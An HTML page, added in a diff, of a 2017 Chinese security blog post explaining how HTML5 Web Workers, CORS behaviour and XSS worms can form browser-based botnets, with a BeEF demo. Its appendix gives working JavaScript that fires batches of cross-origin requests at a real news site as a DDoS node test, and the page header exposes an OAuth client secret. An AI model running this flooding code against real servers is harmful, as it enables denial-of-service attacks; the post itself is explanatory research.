@@ -1,0 +1,423 @@
+<!doctype html>
+<html>
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable"  content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no">
+    
+    
+    <!--Simple SEO-->
+
+
+<meta name="robots" content=all />
+<meta name="google" content=all />
+<meta name="googlebot" content=all />
+<meta name="verify" content=all />
+    <!--Title-->
+
+<title>浅谈Web前端僵尸网络 | Zebork&#39;s Blog</title>
+
+<link rel="alternate" href="/atom.xml" title="Zebork&#39;s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/css/pages/post.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/thirdParty/highlight/github.css">
+<link rel="stylesheet" href="/css/pages/comments.css">
+
+    <!--script-->
+
+
+
+<!--<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>-->
+
+
+<script src="/js/thirdParty/gitment.browser.min.js"></script>
+<script>
+  var labels = "blog,gitment";
+  labels = labels.split(",");
+  var gitment = new Gitment({
+    id: window.location.pathname,
+    owner: "GeekaholicLin",
+    repo: "geekaholiclin.github.io",
+    oauth: {
+      client_id: "aa2215dfc8ee944d1205",
+      client_secret: "77cd2afa5d161bc0ab04639ed81300d808c6e22b"
+    },
+    perPage: "20",
+    labels: labels
+  });
+</script>
+
+    
+    
+</head>
+
+<body id="normal">
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<style>
+    header{ top: 71px; position: absolute!important;}
+    #container{padding-top: 151px!important;}
+</style>
+<div style="position:fixed;z-index:9999;left:0;top:0;width:100%;height:70px;background-color:#e0e0e0;color:#396CA5;border-bottom:1px solid #cecece;text-align:center;line-height:70px;white-space: nowrap;overflow: hidden;text-overflow: ellipsis">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+
+<div id="wrap">
+    <header  style="position: absolute;" >
+    <div id="site-meta">
+        <a href="/" id="logo">
+            <h1 class="title">Zebork&#39;s Blog</h1>
+        </a>
+        
+    </div>
+    <ul id="nav">
+        
+            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+        
+            <li><a href="/atom.xml"><i class="fa fa-rss"></i>RSS</a></li>
+        
+        <li id="search"><a href="javascript:void(0)"><i class="fa fa-search"></i>搜索</a></li>
+    </ul>
+</header>
+
+    <div id="container">
+        
+<ul id="sidebar">
+    
+    
+    
+    
+<li class="widget widget-normal category">
+    <h3 class="fa fa-th widget-title">分类</h3>
+    <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Programing/"><i class="fa" aria-hidden="true">Programing</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/"><i class="fa" aria-hidden="true">Web</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/扯淡/"><i class="fa" aria-hidden="true">扯淡</i></a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link current" href="/categories/无聊折腾/"><i class="fa" aria-hidden="true">无聊折腾</i></a><span class="category-list-count">2</span></li></ul>
+</li>
+
+
+    
+    
+<li class="widget widget-normal archive">
+  <h3 class="fa fa-archive widget-title">归档</h3>
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/"><i class="fa" aria-hidden="true">September 2017</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/"><i class="fa" aria-hidden="true">August 2017</i></a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/"><i class="fa" aria-hidden="true">May 2017</i></a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/"><i class="fa" aria-hidden="true">March 2017</i></a><span class="archive-list-count">1</span></li></ul>
+</li>
+
+
+    
+    
+    
+    
+<li class="widget widget-normal tags">
+  <h3 class="fa fa-tags widget-title">标签云</h3>
+  <div class="tagcloud-content">
+    
+      <a href="/tags/扯淡/" style="font-size: 0.14rem; color: #69c">扯淡</a> <a href="/tags/Web前端/" style="font-size: 0.14rem; color: #69c">Web前端</a> <a href="/tags/僵尸网络/" style="font-size: 0.14rem; color: #69c">僵尸网络</a> <a href="/tags/C/" style="font-size: 0.14rem; color: #69c">C#</a> <a href="/tags/Seafile/" style="font-size: 0.14rem; color: #69c">Seafile</a> <a href="/tags/vSphere/" style="font-size: 0.14rem; color: #69c">vSphere</a> <a href="/tags/pfSense/" style="font-size: 0.14rem; color: #69c">pfSense</a>
+  </div>
+</li>
+
+
+    
+    
+<li class="widget widget-normal friends-link">
+    <h3 class="fa fa-globe widget-title">友链</h3><br/>
+
+    
+        <a href="http://sh3ll.me" class="fa" target="_blank">Chu</a>
+
+    
+        <a href="https://www.leavesongs.com" class="fa" target="_blank">PHITHON</a>
+
+    
+        <a href="https://songcoming.github.io" class="fa" target="_blank">Horizon</a>
+
+    
+        <a href="http://www.xdsec.club" class="fa" target="_blank">xdsec</a>
+
+    
+
+</li>
+
+    
+</ul>
+
+
+        <div id="main">
+    <article id="post">
+        <div id="post-header">
+
+            <h1 id="浅谈Web前端僵尸网络">
+                
+                浅谈Web前端僵尸网络
+                
+            </h1>
+            <div class="article-meta">
+    
+    
+    <span class="categories-meta fa-wrap">
+            <i class="fa fa-folder-open-o"></i>
+        <span>Web</span>
+    </span>
+    
+    
+    <span class="fa-wrap">
+         <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            Web前端
+            
+        </span>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta ">2017/09/01</span>
+    </span>
+    
+    
+    
+</div>
+
+            
+            
+        </div>
+        
+        <div id="post-body">
+            <blockquote>
+<p>转载自<a href="http://www.freebuf.com/articles/network/120749.html" target="_blank" rel="external">Freebuf</a>，虽然原作者就是我。。</p>
+</blockquote>
+<h1 id="Web前端僵尸网络的基本原理"><a href="#Web前端僵尸网络的基本原理" class="headerlink" title="Web前端僵尸网络的基本原理"></a>Web前端僵尸网络的基本原理</h1><p>僵尸网络（Botnet）已出现多年，对网络安全构成了巨大的挑站。随着攻防技术的发展，除了基于PC和服务器的传统僵尸网络，近年来，还出现了多种形态的僵尸网络，如基于智能手机、IOT设备或者Webshell等等的新型僵尸网络。</p>
+<p>除此之外，本文将介绍一种<a href="">基于Web前端的僵尸网络</a>。在新的HTML5标准越来越广泛地被使用之后，HTML5的强大功能为构建僵尸网络提供了可能性。由于这种僵尸网络基于支持HTML5的Web前端浏览器，所以其权限很低。不过，基于Web前端的僵尸网络至少可以用作DDOS攻击，如果处理得当，也可以用作对HTTP服务器进行扫描等操作。</p>
+<p>下面是本文总结的Web前端僵尸网络的技术基础：</p>
+<p>1、HTML5 新增技术——Web Worker技术。这是一种多线程机制，使得浏览器可以在不影响用户操作的同时处理其他事务，这为恶意的JS脚本提供了异步环境；</p>
+<p>2、HTML5 新增机制——跨域资源共享机制（CORS）。CORS处理机制工作在浏览器层面，如果服务器不允许跨站，浏览器将拦截服务器返回的结果。也就是说即使是跨域请求，服务器也同样会处理，并正常返回请求的资源。这个技术本身其实不对僵尸网络构成支持，但是HTML5支持CORS机制之后并未禁止跨域发送请求，这就成了前端僵尸网络立足的关键；</p>
+<p>3、Web蠕虫。类似于传统的蠕虫病毒，Web蠕虫使前端僵尸网络可以自行传播，结合Web蠕虫，前端僵尸网络可以相对容易地形成规模。</p>
+<p>以上三个技术点，合成在一起，为僵尸网络的存在提供了基本条件。下面进行详细介绍。</p>
+<h2 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h2><p>Web Worker 是运行在后台的 Javascript，独立于其他脚本，不会影响页面的性能。下面简单列举一下Web Worker能够做什么。</p>
+<ol>
+<li><p>可以加载一个JS进行大量的复杂计算而不挂起主进程，用户可以在Worker运行期间做点击、选取内容等等任何事情；</p>
+</li>
+<li><p>可以通过postMessage，onmessage方法进行线程通信；</p>
+</li>
+<li><p>可以在Worker中通过importScripts(url)加载另外的脚本文件；</p>
+</li>
+<li><p>可以使用 setTimeout，clearTimeout，setInterval，clearInterval等方法；</p>
+</li>
+<li><p>可以使用XMLHttpRequest来发送请求，以及访问navigator的部分属性。</p>
+</li>
+</ol>
+<p>Web Worker增强了浏览器的能力。功能强大了，危险性也随之增大了。</p>
+<h2 id="CORS跨域资源共享机制"><a href="#CORS跨域资源共享机制" class="headerlink" title="CORS跨域资源共享机制"></a>CORS跨域资源共享机制</h2><p>跨域HTTP请求(Cross-site HTTP request)是一类相对特殊的浏览器请求，这种请求不是浏览器向在本页面为它提供资源的域名发起的，而是浏览器向其他的域名发起的。CORS机制可以让Web应用服务器能支持跨站访问控制，从而使得安全地进行跨站数据传输成为可能。</p>
+<p>很多文章和资料对CORS机制内部工作原理解释的不够清楚，导致本人一度以为CORS是在跨域请求发出时拦截或者在服务器层次禁止了资源的返回。然而实际上CORS安全机制并没有针对服务器提供任何保护。</p>
+<p>本文只针对XMLHttpRequest总结以下几点：</p>
+<ol>
+<li><p>XMLHttpRequest请求可以发送到跨域服务器；</p>
+</li>
+<li><p>跨域服务器会对之前的XMLHttpRequest做出响应；</p>
+</li>
+<li><p>跨域服务器对XMLHttpRequest的响应和正常访问这个服务器产生的响应没有任何区别；</p>
+</li>
+<li><p>未能加载服务器资源的原因是浏览器对跨域资源做出了拦截限制。</p>
+</li>
+</ol>
+<p>因此，对于服务器来说，假设有10000个XMLHttpRequest同时对某资源发出请求，以上的请求与10000个用户同时用浏览器正常访问这个资源是等价的，因为都要做同样的处理，都要返回同样的内容。这也就是说，使用Web Worker和XMLHttpRequest进行DDOS攻击是可行的。</p>
+<h2 id="Web蠕虫"><a href="#Web蠕虫" class="headerlink" title="Web蠕虫"></a>Web蠕虫</h2><p>Web蠕虫是Web前端僵尸自行传播的方法。这种机制利用的是传统前端漏洞，例如XSS漏洞。</p>
+<p><img src="/img/2016/clip_image001.png" alt="img"></p>
+<p>本文没有尝试实现僵尸节点（Web前端）和控制端的交互，这需要更复杂的JS代码，顺便提一下已经实现此类功能的BeEF XSS框架。</p>
+<p>这个框架很流行，集成了很多功能，甚至能够结合MSF使用。但是这些不在本文的探究范围之内。本文只对这个框架控制端和僵尸节点的交互进行演示。</p>
+<p>Kali Linux系统中集成了这个工具，本文用Kali Linux虚拟机进行演示。</p>
+<p>打开BeEF框架之后如图所示，不要关闭这个终端，等待程序加载完成后，一般情况下浏览器会弹出，如果没有弹出，打开浏览器手动输入终端中显示的UI URL。 </p>
+<p><img src="/img/2016/clip_image003.png" alt="img"></p>
+<p>默认的用户名和密码都是beef。登录成功后的页面如下：</p>
+<p><img src="/img/2016/clip_image005.png" alt="img"></p>
+<p>首页上有一些被植入恶意Javascript的Demo。为了演示的方便，使用实体机的Safari浏览器进行访问，将会在左侧显示信息。接下来按照下图点击到如下页面。</p>
+<p><img src="/img/2016/clip_image007.png" alt="img"></p>
+<p>点击红色圆圈中的Execute之后，将会在用户浏览器执行上面方框中输入的Javascript代码，给用户的浏览器弹出一个对话框，下图是实体机的Safari浏览器中的效果：</p>
+<p><img src="/img/2016/clip_image009.png" alt="img"></p>
+<p>通过这种方式，就可以在用户的浏览器中执行控制端需要僵尸节点执行的代码。有兴趣的朋友可以去读一下BeEF框架中hook.js文件源代码，应该会有很多启发。</p>
+<h1 id="僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）"><a href="#僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）" class="headerlink" title="僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）"></a>僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）</h1><p>测试的思路是：植入恶意Javascript代码，批量对某网站发送100次XMLHttpRequest，此次尝试的对象是腾讯的网站，因为单个节点的100次请求肯定对腾讯服务器无影响。攻击url为：<a href="http://news.qq.com/photo.shtml" target="_blank" rel="external">http://news.qq.com/photo.shtml</a>，用户访问的url为：<a href="http://localhost/botnet/index.html" target="_blank" rel="external">http://localhost/botnet/index.html</a>，测试代码见附录。</p>
+<p>通过Wireshark和chrome浏览器network开发者工具对测试结果进行分析：</p>
+<p>Wireshark抓到的tcp流：</p>
+<p><img src="/img/2016/clip_image011.png" alt="img"></p>
+<p>详细查看Response：</p>
+<p><img src="/img/2016/clip_image013.png" alt="img"></p>
+<p>Chrome：</p>
+<p><img src="/img/2016/clip_image015.png" alt="img"></p>
+<p><img src="/img/2016/clip_image017.png" alt="img"></p>
+<p>可以看到，Wireshark抓到了Response是有资源数据的，但是Chrome中得到的只有服务器返回的状态信息，这是CORS机制在浏览器层次对于跨域资源做了限制。</p>
+<p>但是，Wireshark抓包得到的数据可以证明服务器实实在在地对每个请求都做出了正常的响应。当这样的僵尸节点数目和Web Worker并发数目都增大到一定的等级，理论上就可以形成强大的DDOS攻击了。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>HTML5时代的Web前端已经不再那么简单。支持HTML5的浏览器，给了僵尸网络足够的生存空间。</p>
+<h1 id="附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）"><a href="#附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）" class="headerlink" title="附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）"></a>附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）</h1><h2 id="run-worker-js"><a href="#run-worker-js" class="headerlink" title="run_worker.js:"></a>run_worker.js:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">var worker_loc= &apos;worker.js&apos;;</div><div class="line">var workers = new Array();</div><div class="line">var i = 0;</div><div class="line">var noWorker = typeof Worker ==&quot;undefined&quot; ? true : false;</div><div class="line">var target = &apos;http://news.qq.com/photo.shtml&apos;</div><div class="line">if (!noWorker) &#123;</div><div class="line">    try &#123;</div><div class="line">        for(i = 0; i &lt; 1; i++) &#123;</div><div class="line">           workers[i] = new Worker(worker_loc);</div><div class="line">           workers[i].postMessage(target);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    catch(e) &#123;</div><div class="line">       //comment out in release</div><div class="line">        e =e + &quot;&quot;;</div><div class="line">        if(e.indexOf(&quot;Worker is not enabled&quot;) != -1) &#123;</div><div class="line">           noWorker = true;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>​       当浏览器支持Web Worker的时候，就会根据代码循环建立Worker。利用new worker(worker_loc)方式，创建Worker对象，并利用Worker的postMessage方法向worker发送指令等数据。多个Worker可以实现并发。但是本例只建立了一个Worker。</p>
+<h2 id="worker-js"><a href="#worker-js" class="headerlink" title="worker.js:"></a>worker.js:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">function makeRequest(base) &#123;</div><div class="line">    varfullUrl = base</div><div class="line">    varhttpRequest = new XMLHttpRequest();</div><div class="line">   httpRequest.open(&quot;GET&quot;, fullUrl, true);</div><div class="line">   httpRequest.send(null);</div><div class="line">&#125;</div><div class="line">function dos(base) &#123;</div><div class="line">    var i =0;</div><div class="line">    for (i= 0; i &lt; 100; i++) &#123;</div><div class="line">       console.log(base);</div><div class="line">       makeRequest(base);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">self.onmessage = function (e) &#123;</div><div class="line">    base =e.data;</div><div class="line">   dos(base);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Web Worker可以使用XMLHttpRequest发送跨域请求。这个函数可以使用GET和POST两种方法，一般使用GET方法就可以了，但是POST方法不限制发送长度和字符，有些情况必须要用POST方法。本例中采用GET方法测试。</p>
+<h2 id="index-html"><a href="#index-html" class="headerlink" title="index.html:"></a>index.html:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;</div><div class="line">    #page&#123;width: 100%; height: 100%;&#125;</div><div class="line">   body&#123;margin:0&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">    varworker_loc = &apos;worker.js&apos;;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;run_worker.js&quot;&gt;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;iframe id=&quot;page&quot;name=&quot;page&quot; src=&quot;http://www.example.com&quot; frameborder=</div><div class="line">&quot;0&quot;noresize=&quot;noresize&quot;style=&quot;overflow:visible&quot;&gt;&lt;/iframe&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
+<p>index.html几乎没有更改，因为这个网页的内容对恶意javascript的测试没有影响。</p>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>其实在这里写一遍就想补充一下。</p>
+<p>的确，利用XSS蠕虫弄一个门户网站估计费劲不说也会马上被修复，但是，仔细想想，好像有不用XSS就产生了很大效果的事件吧。</p>
+<p>补充到此结束。</p>
+
+        </div>
+        <div id="post-footer">
+            <div class="avatar" >
+                <img src="/img/jay_chou.jpg" alt="avatar"/>
+                
+                
+            </div>
+            <ul class="author-profile-section">
+                <li>
+                  
+                  作者:
+                  
+                    
+                    <a href="/about.html">Zebork</a>
+                </li>
+                
+                <li>发表日期: <span>2017-09-01  01:34:20</span></li>
+                
+                <li>最后编辑日期: <span>2017-09-01  01:34:09</span></li>
+                
+                <li class="post-category">
+                    文章分类:
+                    
+                    <a href="/categories/Web/">Web</a>
+                    
+                </li>
+                <li class="post-tags">
+                    文章标签:
+                    
+                    <a href="/tags/Web前端/">Web前端</a>
+                    
+                    <a href="/tags/僵尸网络/">僵尸网络</a>
+                    
+                </li>
+                
+            </ul>
+            <div id="donate-wrap">
+                
+                
+                
+                <img src="http://example.com/alipay.jpg" alt="支付宝付款" class="donate-img">
+                
+                <img src="http://example.com/wechat.png" alt="微信付款" class="donate-img">
+                
+                
+            </div>
+        </div>
+    </article>
+    <div class="article-nav">
+        
+        
+        <a href="/2017/08/31/2017/vsphere_pfsense_2017-08-31/" class="next-post fa">vSphere + pfSense 虚拟化服务器</a>
+        
+    </div>
+    
+    <div id="comments">
+        
+
+<script>
+  gitment.render(document.getElementById("comments"));
+</script>
+
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+    <footer id="footer">
+    
+    <div class="social">
+        
+        <a href="" class="fa null" target="_blank" title="null"></a>
+        
+        <a href="https://github.com/zebork" class="fa fa-github" target="_blank" title="Follow me~"></a>
+        
+    </div>
+    
+    <div>
+        
+        <a href="/" class="copyright-links">Zebork</a>&copy;2015 - 2017.All Rights
+        Reserved.
+    </div>
+    <p>Powered by <a href="https://hexo.io" class="copyright-links" target="_blank">Hexo</a> | Theme by <a
+                href="https://github.com/GeekaholicLin" class="copyright-links" target="_blank">GeekaholicLin</a>
+    </p>
+    
+</footer>
+
+</div>
+    <ul id="tools">
+    <li class="totop-btn fa fa-angle-up"></li>
+    <li class="exchange-btn fa fa-exchange"></li>
+  
+    <li class="toc-btn fa fa-list-ul"></li>
+    
+    
+
+    
+    <li class="comment-btn fa fa-comments-o">
+        <a href="#comments" title="comments"></a>
+    </li>
+    
+</ul>
+<p id="process"></p>
+<div id="search-overlay">
+    <div class="search-area-wrap">
+        <div id="search-area">
+            <div class="input-wrap focus">
+                <i class="fa fa-search" aria-hidden="true"></i>
+                <input id="search-input" autofocus autocomplete="off" type="text"
+                       placeholder="search this website..."/>
+            </div>
+            <ul id="search-result">
+                <li class="load-first"><i class="fa fa-spinner fa-pulse"></i></li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web前端僵尸网络的基本原理"><span class="toc-number">1.</span> <span class="toc-text">Web前端僵尸网络的基本原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Worker"><span class="toc-number">1.1.</span> <span class="toc-text">Web Worker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS跨域资源共享机制"><span class="toc-number">1.2.</span> <span class="toc-text">CORS跨域资源共享机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web蠕虫"><span class="toc-number">1.3.</span> <span class="toc-text">Web蠕虫</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）"><span class="toc-number">2.</span> <span class="toc-text">僵尸网络节点代码测试（源代码根据《Web前端黑客技术揭秘一书》实例修改）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）"><span class="toc-number">4.</span> <span class="toc-text">附录：测试代码（根据《Web前端黑客技术揭秘》示例代码修改）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#run-worker-js"><span class="toc-number">4.1.</span> <span class="toc-text">run_worker.js:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#worker-js"><span class="toc-number">4.2.</span> <span class="toc-text">worker.js:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#index-html"><span class="toc-number">4.3.</span> <span class="toc-text">index.html:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#补充"><span class="toc-number">5.</span> <span class="toc-text">补充</span></a></li></ol>
+
+
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    //theme config datas
+    var copyrightObj = {};
+    copyrightObj.enable = 'true';
+    copyrightObj.triggerCopyLength = '200';
+    copyrightObj.appendText = '商业转载请联系作者获得授权,非商业转载请注明出处 © example';
+    var leancloudObj = {};
+    leancloudObj.enable = 'false';
+    leancloudObj.className = 'BlogCounter';
+    leancloudObj.limits = '10';
+</script>
+<script type="text/javascript">
+    var search = {};
+    var search_path = "search.xml";
+    if (!search_path) {
+        search_path = "search.xml";
+    }
+    search.path = "/" + search_path;
+    search.func =  _ajax.init();
+</script>
+<script src="/js/app.js"></script>
+
+
+</body>
+</html>
